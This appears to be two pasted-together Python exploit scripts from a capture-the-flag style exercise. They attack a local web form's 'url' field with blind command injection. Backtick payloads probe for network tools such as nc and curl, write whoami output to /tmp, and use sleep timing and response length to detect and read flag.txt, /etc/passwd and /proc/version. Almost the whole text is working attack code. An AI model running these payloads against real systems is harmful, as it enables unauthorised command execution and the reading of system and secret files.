import requests
import time

BASE_URL = "http://127.0.0.1:32998/add_url"
headers = {"Content-Type": "application/x-www-form-urlencoded"}

def test(payload):
    data = f"url={payload}"
    try:
        start = time.time()
        resp = requests.post(BASE_URL, headers=headers, data=data, timeout=15)
        elapsed = time.time() - start
        return elapsed, resp.status_code, len(resp.text)
    except Exception as e:
        return 0, "ERROR", 0

print("[+] Testing file write and utility detection")

# First detect utilities
utils = [
    "curl",
    "wget", 
    "python",
    "python3",
    "nc",
    "ncat",
    "ping",
]

for util in utils:
    payload = f"`which {util} && sleep 0.5`"
    elapsed, status, length = test(payload)
    print(f"{util}: {elapsed:.2f}s (sleep fired means exists)")

# Test file write
print("\n[+] Testing file write...")
write_tests = [
    ("`whoami > /tmp/test.txt 2>&1`", "write whoami"),
    ("`[ -f /tmp/test.txt ] && sleep 1`", "check file exists"),
    ("`cat /tmp/test.txt`", "read file back"),
]

for payload, desc in write_tests:
    elapsed, status, length = test(payload)
    print(f"{desc}: {elapsed:.2f}s, Status={status}")


import requests
import time

BASE_URL = "http://127.0.0.1:32998/add_url"
headers = {"Content-Type": "application/x-www-form-urlencoded"}

def test(payload):
    data = f"url={payload}"
    try:
        start = time.time()
        resp = requests.post(BASE_URL, headers=headers, data=data, timeout=15)
        elapsed = time.time() - start
        return elapsed, resp.status_code, len(resp.text)
    except Exception as e:
        return 0, "ERROR", 0

print("[+] Trying alternative file existence techniques")
print("="*60)

# Try using ls - if file exists, ls succeeds; if not, fails
# We can detect this via timing or error behavior
alt_tests = [
    # Using ls return code
    ("`ls flag.txt > /dev/null 2>&1 && sleep 1`", "ls flag.txt"),
    ("`ls /app/flag.txt > /dev/null 2>&1 && sleep 1`", "ls /app/flag.txt"),
    ("`ls flag > /dev/null 2>&1 && sleep 1`", "ls flag"),
    ("`ls /etc/passwd > /dev/null 2>&1 && sleep 1`", "ls /etc/passwd (exists)"),
    
    # Using stat
    ("`stat flag.txt > /dev/null 2>&1 && sleep 1`", "stat flag.txt"),
    ("`stat /app/flag.txt > /dev/null 2>&1 && sleep 1`", "stat /app/flag.txt"),
    ("`stat /etc/passwd > /dev/null 2>&1 && sleep 1`", "stat /etc/passwd (exists)"),
    
    # Using cat with line count
    ("`cat flag.txt 2>/dev/null | wc -l | grep -qv ^0 && sleep 1`", "flag.txt has content"),
    ("`cat /app/flag.txt 2>/dev/null | wc -l | grep -qv ^0 && sleep 1`", "/app/flag.txt has content"),
    ("`cat /etc/passwd 2>/dev/null | wc -l | grep -qv ^0 && sleep 1`", "/etc/passwd has content"),
    
    # Try file command
    ("`file flag.txt 2>/dev/null | grep -q ASCII && sleep 1`", "flag.txt is ASCII"),
    ("`file /app/flag.txt 2>/dev/null | grep -q ASCII && sleep 1`", "/app/flag.txt is ASCII"),
    ("`file /etc/passwd 2>/dev/null | grep -q ASCII && sleep 1`", "/etc/passwd is ASCII"),
    
    # Directory-based checks
    ("`ls -d flag* 2>/dev/null && sleep 1`", "flag* pattern exists"),
    ("`ls -d /app/flag* 2>/dev/null && sleep 1`", "/app/flag* exists"),
    
    # Check if we can read anything at all
    ("`cat /etc/hostname 2>/dev/null | wc -l | grep -qv ^0 && sleep 1`", "can read /etc/hostname"),
    ("`cat /proc/version 2>/dev/null | wc -l | grep -qv ^0 && sleep 1`", "can read /proc/version"),
]

print("Testing alternative existence checks:\n")
for payload, desc in alt_tests:
    elapsed, status, length = test(payload)
    indicator = "[!] EXISTS" if elapsed >= 0.8 else "not found"
    print(f"{desc}: {elapsed:.2f}s | {indicator}")

# Let's also try the ERROR/length pattern I found earlier
print("\n" + "="*60)
print("[+] Using response length/ERROR pattern")
print("="*60)

def test_detailed(payload):
    data = f"url={payload}"
    try:
        resp = requests.post(BASE_URL, headers=headers, data=data, timeout=10)
        return resp.status_code, len(resp.text)
    except Exception as e:
        return "ERROR", 0

length_tests = [
    # Output that starts with digit causes error
    ("`cat /etc/passwd 2>/dev/null | head -c 1`", "/etc/passwd first char"),
    ("`cat flag.txt 2>/dev/null | head -c 1`", "flag.txt first char"),
    ("`cat /app/flag.txt 2>/dev/null | head -c 1`", "/app/flag.txt first char"),
    
    # Check if file is readable with less output
    ("`head -c 5 /etc/passwd 2>/dev/null`", "/etc/passwd 5 chars"),
    ("`head -c 5 flag.txt 2>/dev/null`", "flag.txt 5 chars"),
    ("`head -c 5 /app/flag.txt 2>/dev/null`", "/app/flag.txt 5 chars"),
    
    # Check if file exists by checking if cat outputs anything
    ("`cat flag.txt 2>/dev/null`", "raw cat flag.txt"),
    ("`cat /app/flag.txt 2>/dev/null`", "raw cat /app/flag.txt"),
]

print("\nTesting response characteristics:")
for payload, desc in length_tests:
    status, length = test_detailed(payload)
    print(f"{desc}: Status={status}, Len={length}")

